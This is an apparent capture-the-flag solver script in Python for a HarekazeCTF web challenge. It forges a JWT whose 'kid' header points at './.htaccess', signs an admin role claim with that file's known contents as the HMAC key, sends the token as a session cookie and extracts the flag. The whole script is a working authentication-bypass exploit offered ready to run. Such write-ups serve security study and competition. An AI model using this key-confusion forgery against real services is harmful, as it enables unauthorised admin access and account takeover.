import base64
import hashlib
import hmac
import json
import os
import re
import requests

host = os.getenv('HOST', '0.0.0.0')
port = os.getenv('PORT', '8001')
url = 'http://{}:{}/'.format(host, port)

def b64encode(obj):
  return base64.urlsafe_b64encode(obj).replace(b'=', b'')

# Generating JWT
header = {
  'typ': 'JWT',
  'kid': './.htaccess',
  'alg': 'HS256'
}
data = {
  'username': 'admin',
  'role': 'admin'
}
secret = b'deny from all'

signing_input = b64encode(json.dumps(header).encode()) + b'.' + b64encode(json.dumps(data).encode())
signature = hmac.new(secret, signing_input, hashlib.sha256).digest()
jwt = signing_input + b'.' + b64encode(signature)

# Go!
r = requests.get(url + '?page=admin', cookies={
  'jwtsession': jwt.decode()
})
flag = re.findall(r'(HarekazeCTF\{.+?\})', r.content.decode())[0]

print(flag)
